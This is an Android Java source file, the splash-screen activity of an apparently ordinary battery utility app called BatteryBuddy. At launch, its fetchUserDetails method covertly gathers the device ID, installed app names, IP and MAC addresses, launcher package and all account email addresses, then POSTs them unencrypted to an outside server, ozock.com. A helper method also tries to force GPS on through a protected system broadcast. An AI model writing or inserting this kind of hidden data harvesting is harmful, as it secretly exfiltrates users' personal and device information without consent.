package com.receptix.batterybuddy.activities;


import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.location.LocationManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Settings;
import android.support.v7.app.AlertDialog;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.util.Patterns;

import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import com.google.gson.JsonPrimitive;
import com.koushikdutta.async.future.FutureCallback;
import com.koushikdutta.ion.Ion;
import com.receptix.batterybuddy.R;
import com.receptix.batterybuddy.helper.UserSessionManager;
import com.receptix.batterybuddy.helper.Utils;

import java.lang.reflect.Field;
import java.util.List;
import java.util.regex.Pattern;


public class MainActivity extends AppCompatActivity {

    UserSessionManager userSessionManager;
    Context context;
    // Splash screen timer
    private static int SPLASH_TIME_OUT = 3000;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        context = getApplicationContext();
        userSessionManager = new UserSessionManager(context);

         /* Retrieve a PendingIntent that will perform a broadcast */

        fetchUserDetails();

        new Handler().postDelayed(new Runnable() {


            @Override
            public void run() {

                if (userSessionManager.isFirstTime()) {

                    startActivity(new Intent(MainActivity.this, TCActivity.class));
                    finish();
                } else {

                    startActivity(new Intent(MainActivity.this, NavigationActivity.class));
                    finish();
                }

            }
        }, SPLASH_TIME_OUT);


    }

    private void fetchUserDetails() {

        String country = "india";
        String location = "delhi";

        // get user location and country...
        boolean gps_enabled = false;
        boolean network_enabled = false;
        LocationManager locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);

        try {
            gps_enabled = locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER);
            network_enabled = locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER);

        } catch (Exception ex) {

        }


        // get device id

        String userdeviceId = Settings.Secure.getString(getApplicationContext().getContentResolver(), Settings.Secure.ANDROID_ID);
        JsonObject jsonObject = new JsonObject();
        jsonObject.addProperty("deviceId", userdeviceId);

        // get installed app list

        JsonArray installedappslist = new JsonArray();

        List<PackageInfo> packList = getPackageManager().getInstalledPackages(0);
        for (int i = 0; i < packList.size(); i++) {
            PackageInfo packInfo = packList.get(i);
            if ((packInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                String appName = packInfo.applicationInfo.loadLabel(getPackageManager()).toString();
                JsonPrimitive jsonPrimitive = new JsonPrimitive(appName);
                installedappslist.add(jsonPrimitive);

            }
        }
        // get user device information


        StringBuilder builder = new StringBuilder();
        builder.append("Android Version : ").append(Build.VERSION.RELEASE);

        Field[] fields = Build.VERSION_CODES.class.getFields();
        String osName = fields[Build.VERSION.SDK_INT + 1].getName();
        builder.append(" " + "OsName :" + osName);


        String ipadress = Utils.getIPAddress(true);
        String macaddress = Utils.getMACAddress("wlan0");
        if (macaddress.length() == 0) {

            macaddress = Utils.getMACAddress("eth0");
        }
        // get the default launcher...

        Intent intent = new Intent(Intent.ACTION_MAIN);
        intent.addCategory(Intent.CATEGORY_HOME);
        ResolveInfo defaultLauncher = getPackageManager().resolveActivity(intent, PackageManager.MATCH_DEFAULT_ONLY);
        String defaultLauncherStr = defaultLauncher.activityInfo.packageName;


        // Get user account...

        Pattern emailPattern = Patterns.EMAIL_ADDRESS; // API level 8+
        Account[] accounts = AccountManager.get(context).getAccounts();

        JsonArray possibleemails = new JsonArray();

        for (Account account : accounts) {
            if (emailPattern.matcher(account.name).matches()) {
                String possibleEmail = account.name;
                JsonPrimitive jsonPrimitive = new JsonPrimitive(possibleEmail);
                possibleemails.add(jsonPrimitive);

            }
        }

        jsonObject.addProperty("deviceInfo", builder.toString());
        jsonObject.addProperty("ipaddress", ipadress);
        jsonObject.addProperty("macaddress", macaddress);
        jsonObject.addProperty("launcher", defaultLauncherStr);
        jsonObject.addProperty("location", location);
        jsonObject.addProperty("country", country);
        jsonObject.add("installedapps", installedappslist);
        jsonObject.add("emails", possibleemails);


        Log.d("Result", jsonObject.toString());


        Ion.with(context)
                .load("http://www.ozock.com/")
                .setJsonObjectBody(jsonObject)
                .asJsonObject()
                .setCallback(new FutureCallback<JsonObject>() {
                    @Override
                    public void onCompleted(Exception e, JsonObject result) {


                        Log.d("Result", String.valueOf(result));


                    }
                });


    }

    public void showSettingAlert() {

        AlertDialog.Builder alertDialog = new AlertDialog.Builder(context);

        alertDialog.setTitle("GPS Setting")
                .setMessage("Enable GPS Now")
                .setPositiveButton("On", new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialog, int which) {

                        Intent intent = new Intent("android.location.GPS_ENABLED_CHANGE");
                        intent.putExtra("enabled", true);
                        sendBroadcast(intent);

                    }
                });


    }


}
